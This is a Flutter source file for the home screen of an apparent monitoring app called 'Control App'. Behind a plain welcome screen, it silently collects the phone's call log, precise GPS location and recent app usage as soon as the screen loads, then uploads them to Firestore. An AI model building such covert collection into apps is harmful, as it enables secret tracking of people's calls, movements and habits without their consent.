import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:control_app/model/user_model.dart';
import 'package:control_app/model/user_model.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/material.dart';
import 'login.dart';
import 'package:control_app/model/aramakaydi_model.dart';
import 'package:call_log/call_log.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:geolocator/geolocator.dart';
import 'package:control_app/model/konum.dart';
import 'package:intl/intl.dart'; // intl paketini import ettik
import 'package:usage_stats/usage_stats.dart';
import 'package:control_app/model/uygulama_kullanimi.dart';



class HomeScreen extends StatefulWidget {
  const HomeScreen({Key? key}) : super(key: key);

  @override
  _HomeScreenState createState() => _HomeScreenState();
  
}


class _HomeScreenState extends State<HomeScreen> {

  User? user = FirebaseAuth.instance.currentUser;
  UserModel loggedInUser = UserModel();
   List<EventUsageInfo> events = [];
  CollectionReference _usageStatsCollection =
      FirebaseFirestore.instance.collection('uygulama_kullanimi');   





  @override
  
  void initState() {
    super.initState();
    FirebaseFirestore.instance
        .collection("users")
        .doc(user!.uid)
        .get()
        .then((value) {
      this.loggedInUser = UserModel.fromMap(value.data());
      setState(() {});
    aramaKaydiGonder();
    sonkonumBilgisiGonder();
    uygulama_istatistik();
    });

  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text("Control App"),
        centerTitle: true,
      ),
      body: Center(
        child: Padding(
          padding: EdgeInsets.all(20),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            crossAxisAlignment: CrossAxisAlignment.center,
            children: <Widget>[
              // SizedBox(
              //   height: 150,
              //   child: Image.asset("assets/logo.png", fit: BoxFit.contain),
              // ),
              Text(
                "Hoş Geldiniz.",
                style: TextStyle(fontSize: 20, fontWeight: FontWeight.bold),
              ),
              SizedBox(
                height: 10,
              ),
              Text("${loggedInUser.ad} ${loggedInUser.soyad}",
                  style: TextStyle(
                    color: Colors.black54,
                    fontWeight: FontWeight.w500,
                  )),
              Text("${loggedInUser.email}",
                  style: TextStyle(
                    color: Colors.black54,
                    fontWeight: FontWeight.w500,
                  )),
              SizedBox(
                height: 15,
              ),
              ActionChip(
                  label: Text("Çıkış Yap"),
                  onPressed: () {
                    logout(context);
                  }),
            ],
          ),
        ),
      ),
    );
  }

 
void sendToFirestore(String collectionName, String uid, Map<String, dynamic> data) async {
  FirebaseFirestore firestore = FirebaseFirestore.instance;
  CollectionReference collection = firestore.collection('logs/$uid/$collectionName');
  await collection.add(data);
}


//arama kaydı
Future<void> aramaKaydiGonder() async {
  FirebaseAuth auth = FirebaseAuth.instance;
  String? uid = auth.currentUser?.uid;
  
  if (uid != null) {
    await CallLog.query();
    Iterable<CallLogEntry> entries = await CallLog.get();

    for (var entry in entries) {
      Map<String, dynamic> callLog = {
        'numara': entry.number ?? '',
        'saniye': entry.duration ?? 0,
        'timestamp': entry.timestamp ?? 0,
        'tarih': DateTime.fromMillisecondsSinceEpoch(entry.timestamp!),
      };

      await sendToFirestore('aramaKaydi', uid, callLog);
    }
  }
}
  

  Future<void> sonkonumBilgisiGonder() async {
    FirebaseAuth auth = FirebaseAuth.instance;
String? uid = auth.currentUser?.uid;
if (uid != null) {
  final FirebaseFirestore _firestore = FirebaseFirestore.instance;
  final FirebaseAuth _auth = FirebaseAuth.instance;
  
  // Kullanıcının oturum açtığından emin olun
  if (_auth.currentUser != null) {
    // Konum bilgisini al
    Position position = await Geolocator.getCurrentPosition(
      desiredAccuracy: LocationAccuracy.high);

    // Konum bilgisi objesini oluştur
    Konum konum = Konum(
      latitude: position.latitude,
      longitude: position.longitude,
      tarih: DateFormat('yyyy-MM-dd HH:mm:ss').format(DateTime.now()),
    );

    // Firestore'a konum bilgisini gönder
    sendToFirestore('konumlar', uid, konum.toMap());  }
  }
}



//uygulama kullanım istatistiği
Future<void> uygulama_istatistik() async {
  FirebaseAuth auth = FirebaseAuth.instance;
String? uid = auth.currentUser?.uid;
if (uid != null) {
  UsageStats.grantUsagePermission();
  DateTime endDate = DateTime.now();
  DateTime startDate = DateTime.now().subtract(Duration(days: 10));

  List<EventUsageInfo> queryEvents =
      await UsageStats.queryEvents(startDate, endDate);

  setState(() {
    events = queryEvents.reversed.toList();
  });

  List<Map<String, dynamic>> top5Apps = [];
  int count = 0;
  for (var event in events) {
    if (count == 5) break; // Sadece ilk 5 uygulamayı gönder
    top5Apps.add({
      'uygulamaAdi': event.packageName!,
      'sonKullanim': DateTime.fromMillisecondsSinceEpoch(
              int.parse(event.timeStamp!))
          .toIso8601String(),
    });
    count++;
  }

  for (var appData in top5Apps) {
     sendToFirestore('uygulama_istatistik', uid, appData);  }
}
  
}

 



  // logout
  Future<void> logout(BuildContext context) async {
    await FirebaseAuth.instance.signOut();
    Navigator.of(context).pushReplacement(
        MaterialPageRoute(builder: (context) => LoginScreen()));
  }

}

